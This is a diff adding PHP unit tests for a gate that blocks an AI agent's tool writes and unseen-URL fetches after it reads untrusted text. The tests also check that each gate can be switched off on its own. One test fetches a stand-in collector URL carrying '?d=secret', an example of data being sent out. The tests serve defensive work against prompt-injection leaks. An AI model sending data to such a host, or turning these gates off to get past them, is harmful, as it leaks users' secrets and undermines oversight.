@@ -55,6 +55,30 @@ class MCPToolExecutorWriteAfterUntrustedReadTest extends UnitTestCase
         self::assertSame(MCPToolResponse::REFUSAL_WRITE_AFTER_UNTRUSTED_READ, $refusal->refusalKind);
     }
 
+    public function testUnderOffAWriteAfterAnUntrustedReadRunsAlsoInADelegatedSubTask(): void
+    {
+        $executor = new UntrustedReadGateToolExecutor();
+        $executor->writeAfterUntrustedReadMode = MCPToolContentTrust::WRITE_AFTER_UNTRUSTED_READ_OFF;
+        $request = OwnerConsentRequest::forAction('probeWriteRecord', 'WRITE_AFTER_UNTRUSTED_READ', 'target', 'consequence', 'key');
+        // a consent step that would refuse: under off it is never asked
+        $executor->givenOwnerConsentReservation = OwnerConsentReservation::notReserved($request, OwnerConsentVerdict::failed(OwnerConsentVerdict::FAILURE_SITE_OFF));
+        self::assertNull($this->holdCall('probeWriteRecord', [], $this->provenanceAfterReading('probeReadForeignText'), $executor));
+    }
+
+    public function testTheUnseenUrlRefusalHasItsOwnSetting(): void
+    {
+        $provenance = $this->provenanceAfterReading('probeReadForeignText');
+        $executor = new UntrustedReadGateToolExecutor();
+        $executor->writeAfterUntrustedReadMode = MCPToolContentTrust::WRITE_AFTER_UNTRUSTED_READ_OFF;
+        self::assertSame(
+            MCPToolResponse::REFUSAL_UNSEEN_URL_AFTER_UNTRUSTED_READ,
+            $this->holdCall('probeFetchPage', ['url' => 'https://collector.example.net/?d=secret'], $provenance, $executor)?->refusalKind,
+            'switching the write gate off leaves the URL refusal on'
+        );
+        $executor->unseenUrlAfterUntrustedReadMode = MCPToolContentTrust::UNSEEN_URL_AFTER_UNTRUSTED_READ_OFF;
+        self::assertNull($this->holdCall('probeFetchPage', ['url' => 'https://collector.example.net/?d=secret'], $provenance, $executor));
+    }
+
     public function testReadsWorkspaceCallsAndOwnConsentStepsPass(): void
     {
         $provenance = $this->provenanceAfterReading('probeReadForeignText');
